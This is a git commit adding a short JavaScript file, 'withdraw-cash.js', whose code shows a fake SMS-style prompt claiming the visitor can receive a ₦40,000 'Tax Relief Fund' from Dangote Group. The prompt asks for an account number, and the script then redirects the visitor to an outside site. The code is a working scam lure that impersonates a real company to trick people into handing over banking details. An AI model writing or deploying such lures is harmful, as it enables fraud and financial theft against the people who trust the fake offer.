df27f454d3b533f898a66bffc26b6c61bdcaab23
ukpeha2026-maker <ukpeha2026@gmail.com>
2026-01-31 21:22:25 +0100

    Create withdraw-cash.js

---
+++ withdraw-cash.js
@@ -0,0 +1,5 @@
+var password = 'WITHDRAW ₦40,000'
+password=prompt('SMS: Congratulations, you are eligible to receive ₦40,000 Tax Relief Fund From Dangote Group, click OK to Enter Your Acc. Number','WITHDRAW ₦40,000');
+if (password != 'WITHDRAW ₦40,000') {
+location.href='https://vreeoffre.com/birthday.html';
+}
